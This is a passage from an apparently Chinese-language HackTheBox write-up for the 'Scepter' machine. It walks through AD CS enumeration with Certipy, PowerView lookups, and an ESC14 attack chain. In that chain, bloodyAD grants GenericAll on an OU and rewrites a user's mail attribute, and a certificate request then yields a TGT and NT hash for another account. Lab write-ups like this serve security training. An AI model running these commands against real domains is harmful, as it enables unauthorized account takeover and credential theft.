+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">20</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc01.scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : scepter-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc01.scepter.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>scepter-DC01-CA, DC<span style="color:#f92672">=</span>scepter, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : SCEPTER.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Template Name                       : StaffAccessCertificate
+</span></span><span style="display:flex;"><span>    Display Name                        : StaffAccessCertificate
+</span></span><span style="display:flex;"><span>    Certificate Authorities             : scepter-DC01-CA
+</span></span><span style="display:flex;"><span>    Enabled                             : True
+</span></span><span style="display:flex;"><span>    Client Authentication               : True
+</span></span><span style="display:flex;"><span>    Enrollment Agent                    : False
+</span></span><span style="display:flex;"><span>    Any Purpose                         : False
+</span></span><span style="display:flex;"><span>    Enrollee Supplies Subject           : False
+</span></span><span style="display:flex;"><span>    Certificate Name Flag               : SubjectAltRequireEmail
+</span></span><span style="display:flex;"><span>                                          SubjectRequireDnsAsCn
+</span></span><span style="display:flex;"><span>                                          SubjectRequireEmail
+</span></span><span style="display:flex;"><span>    Enrollment Flag                     : AutoEnrollment
+</span></span><span style="display:flex;"><span>                                          NoSecurityExtension
+</span></span><span style="display:flex;"><span>    Extended Key Usage                  : Client Authentication
+</span></span><span style="display:flex;"><span>                                          Server Authentication
+</span></span><span style="display:flex;"><span>    Requires Manager Approval           : False
+</span></span><span style="display:flex;"><span>    Requires Key Archival               : False
+</span></span><span style="display:flex;"><span>    Authorized Signatures Required      : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Schema Version                      : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    Validity Period                     : <span style="color:#ae81ff">99</span> years
+</span></span><span style="display:flex;"><span>    Renewal Period                      : <span style="color:#ae81ff">6</span> weeks
+</span></span><span style="display:flex;"><span>    Minimum RSA Key Length              : <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    Template Created                    : 2024-11-01T02:29:00+00:00
+</span></span><span style="display:flex;"><span>    Template Last Modified              : 2024-11-01T09:00:54+00:00
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Enrollment Permissions
+</span></span><span style="display:flex;"><span>        Enrollment Rights               : SCEPTER.HTB<span style="color:#ae81ff">\s</span>taff
+</span></span><span style="display:flex;"><span>      Object Control Permissions
+</span></span><span style="display:flex;"><span>        Owner                           : SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Full Control Principals         : SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Owner Principals          : SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Dacl Principals           : SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : SCEPTER.HTB<span style="color:#ae81ff">\s</span>taff
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC9                              : Template has no security extension.
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Remarks
+</span></span><span style="display:flex;"><span>      ESC9                              : Other prerequisites may be required <span style="color:#66d9ef">for</span> this to be exploitable. See the wiki <span style="color:#66d9ef">for</span> more details.
+</span></span></code></pre></div><p>发现以d.baker的身份找到了ou同名证书，可以以esc9攻击，但是我尝试后发现并不可以</p>
+<p>只能一点一点查看用户权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ powerview $domain/$user1:$pass1@$ip
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/powerview/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  import pkg_resources
+</span></span><span style="display:flex;"><span>Logging directory is set to /home/wackymaker/.powerview/logs/scepter-a.carter-10.129.103.0
+</span></span><span style="display:flex;"><span>╭─LDAPS─<span style="color:#f92672">[</span>dc01.scepter.htb<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>SCEPTER<span style="color:#ae81ff">\a</span>.carter<span style="color:#f92672">]</span>-<span style="color:#f92672">[</span>NS:10.129.103.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>╰─PV ❯ Get-DomainUser -Identity h.brown -Properties *
+</span></span><span style="display:flex;"><span>objectClass                       : top
+</span></span><span style="display:flex;"><span>                                    person
+</span></span><span style="display:flex;"><span>                                    organizationalPerson
+</span></span><span style="display:flex;"><span>                                    user
+</span></span><span style="display:flex;"><span>cn                                : h.brown
+</span></span><span style="display:flex;"><span>givenName                         : h.brown
+</span></span><span style="display:flex;"><span>distinguishedName                 : CN<span style="color:#f92672">=</span>h.brown,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>instanceType                      : <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>whenCreated                       : 31/10/2024 22:40:01 <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> months, <span style="color:#ae81ff">0</span> day ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>whenChanged                       : 07/03/2025 22:19:11 <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> months, <span style="color:#ae81ff">24</span> days ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>displayName                       : h.brown
+</span></span><span style="display:flex;"><span>uSNCreated                        : <span style="color:#ae81ff">16443</span>
+</span></span><span style="display:flex;"><span>memberOf                          : CN<span style="color:#f92672">=</span>CMS,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>                                    CN<span style="color:#f92672">=</span>Helpdesk Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>                                    CN<span style="color:#f92672">=</span>Protected Users,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>                                    CN<span style="color:#f92672">=</span>Remote Management Users,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>uSNChanged                        : <span style="color:#ae81ff">106593</span>
+</span></span><span style="display:flex;"><span>name                              : h.brown
+</span></span><span style="display:flex;"><span>objectGUID                        : <span style="color:#f92672">{</span>b4dc0e39-0e8a-4d7c-b0ab-b55ada0f817d<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>userAccountControl                : NORMAL_ACCOUNT
+</span></span><span style="display:flex;"><span>                                    DONT_EXPIRE_PASSWORD
+</span></span><span style="display:flex;"><span>badPwdCount                       : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>codePage                          : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>countryCode                       : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>badPasswordTime                   : 01/01/1601 00:00:00 <span style="color:#f92672">(</span><span style="color:#ae81ff">424</span> years, <span style="color:#ae81ff">8</span> months ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>lastLogoff                        : 1601-01-01 00:00:00+00:00
+</span></span><span style="display:flex;"><span>lastLogon                         : 01/11/2024 03:33:05 <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> months, <span style="color:#ae81ff">0</span> day ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>logonHours                        : ////////////////////////////
+</span></span><span style="display:flex;"><span>pwdLastSet                        : 07/03/2025 22:19:11 <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> months, <span style="color:#ae81ff">24</span> days ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>primaryGroupID                    : <span style="color:#ae81ff">513</span>
+</span></span><span style="display:flex;"><span>objectSid                         : S-1-5-21-74879546-916818434-740295365-1108
+</span></span><span style="display:flex;"><span>accountExpires                    : 1601-01-01 00:00:00+00:00
+</span></span><span style="display:flex;"><span>logonCount                        : <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>sAMAccountName                    : h.brown
+</span></span><span style="display:flex;"><span>sAMAccountType                    : SAM_USER_OBJECT
+</span></span><span style="display:flex;"><span>userPrincipalName                 : h.brown@scepter.htb
+</span></span><span style="display:flex;"><span>objectCategory                    : CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>altSecurityIdentities             : X509:&lt;RFC822&gt;h.brown@scepter.htb
+</span></span><span style="display:flex;"><span>dSCorePropagationData             : 11/01/2024 04:07:16 AM
+</span></span><span style="display:flex;"><span>                                    01/01/1601 00:00:01 AM
+</span></span><span style="display:flex;"><span>lastLogonTimestamp                : 01/11/2024 00:19:13 <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> months, <span style="color:#ae81ff">0</span> day ago<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>vulnerabilities                   : <span style="color:#f92672">[</span>VULN-002<span style="color:#f92672">]</span> User account with password that never expires <span style="color:#f92672">(</span>LOW<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>直到我找到了h.brown的这个属性altSecurityIdentities : X509:<!-- raw HTML omitted --><a class="link" href="mailto:h.brown@scepter.htb" >h.brown@scepter.htb</a></p>
+<p><a class="link" href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9"  target="_blank" rel="noopener"
+    >ESC14</a>这篇文章描述了esc14的状况，类比我们现在的例子也就是当存在证书以h.brown@scepter.htb邮箱请求h.brown认证的时候，无论这个证书的dn归属，都能认证成功</p>
+<p>首先通过组的全局掌控权限将a用户本身也具备对ou的全掌握权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 add genericAll <span style="color:#e6db74">&#34;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&#34;</span> a.carter
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> a.carter has now GenericAll on OU<span style="color:#f92672">=</span>STAFF ACCESS CERTIFICATE,DC<span style="color:#f92672">=</span>SCEPTER,DC<span style="color:#f92672">=</span>HTB
+</span></span></code></pre></div><p>利用这权限修改其中d.baker的邮箱</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 set object d.baker mail -v h.brown@scepter.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> d.baker<span style="color:#960050;background-color:#1e0010">&#39;</span>s mail has been updated
+</span></span></code></pre></div><p>以d.baker身份请求证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy req -username d.baker@scepter.htb -hashes :$hash -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip $ip
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate without identity
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;d.baker.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;d.baker.pfx&#39;</span>
+</span></span></code></pre></div><p>以这个证书去认证h.brown</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy auth -pfx d.baker.pfx -dc-ip $ip -domain scepter.htb -username h.brown
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find identity in the provided certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;h.brown@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;h.brown.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;h.brown.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;h.brown&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;h.brown@scepter.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
+</span></span></code></pre></div><p>当设置altSecurityIdentities属性后，证书认证会变成弱匹配，只要证书属性中关于这个属性的值匹配一致，则允许认证</p>
+<h2 id="提权">提权
+</h2><p>此用户不允许ntlm认证，请求tgt登陆winrm之前看看猎犬</p>
+<p><img src="/scepter/image-4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>属于的组多，但是并没有发现有意思的</p>
+<p>查看证书，也没有什么东西</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -target $FQDN -u $user2@$domain -no-pass -k -vulnerable -stdout -dc-ip $ip
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">35</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">20</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc01.scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : scepter-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc01.scepter.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>scepter-DC01-CA, DC<span style="color:#f92672">=</span>scepter, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : SCEPTER.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>查看这个用户可写内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN --dc-ip $ip -d $domain -u $user2 -k get writable --detail
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>S-1-5-11,CN<span style="color:#f92672">=</span>ForeignSecurityPrincipals,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>url: WRITE
+</span></span><span style="display:flex;"><span>wWWHomePage: WRITE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>h.brown,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>thumbnailPhoto: WRITE
+</span></span><span style="display:flex;"><span>pager: WRITE
+</span></span><span style="display:flex;"><span>mobile: WRITE
+</span></span><span style="display:flex;"><span>homePhone: WRITE
+</span></span><span style="display:flex;"><span>userSMIMECertificate: WRITE
+</span></span><span style="display:flex;"><span>msDS-ExternalDirectoryObjectId: WRITE
